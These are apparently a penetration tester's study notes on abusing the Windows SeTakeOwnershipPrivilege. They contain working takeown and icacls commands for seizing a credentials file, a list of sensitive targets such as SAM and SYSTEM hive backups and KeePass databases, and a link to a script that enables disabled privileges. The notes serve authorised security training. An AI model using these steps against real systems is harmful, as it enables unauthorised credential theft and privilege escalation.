
[SeTakeOwnershipPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects) grants a user the ability to take ownership of any "securable object," meaning Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes. This privilege assigns `[WRITE_OWNER`] rights over an object, meaning the user can change the owner within the object's security descriptor.
admins have this by default, service accounts may have this 
#### Impact:
- take ownership of any secureable object (files, folders, registry, AD objects)
- Read sensitive files that our current user is not allowed to.
- #### exploitation Requirements
    1. You hold **`SeTakeOwnershipPrivilege`** on the machine that _enforces the ACL_ and hosts the file that's being shared.
    2. If you’re accessing `\\fileserver\share\secret.txt` and the **fileserver** enforces the ACL.
- #### exploitation steps
- use `takeown` to take ownership of the file (now you can edit the ACL)
- use `icalcs`to  grant all rights (read/write/execute/full control)
---
#### interesting files:
```shell-session
config files, unattend.xml, dpapi, docs, text files with passwords
c:\inetpub\wwwwroot\web.config
`.kdbx` KeePass database files, OneNote notebooks, files such as `passwords.*`, `pass.*`, `creds.*`, scripts, other configuration files, virtual hard drive files...more
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\system.sav
```

We may also come across  that we can target to extract sensitive information from to elevate our privileges and further our access.

---
#### example scenario
if privilege is there but disabled
`script to enable priv`
https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1

1. `checking Acl on target file`
```
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
```

2. `taking ownership of file, change owner to self`
```powershell-session
takeown /f 'C:\Department Shares\Private\IT\cred.txt'
```

3. `change acl rights to full control (F)`
```powershell-session
> icacls 'C:\Department Shares\Private\IT\cred.txt' /grant vipa0z:F
```

#### cleanup
After performing these changes, we would want to make every effort to revert the permissions/file ownership. If we cannot for some reason, we should alert our client and carefully document the modifications in an appendix of our report deliverable. 



# extra Read
(https://docs.microsoft.com/en-us/windows/win32/secauthz/standard-access-rights)
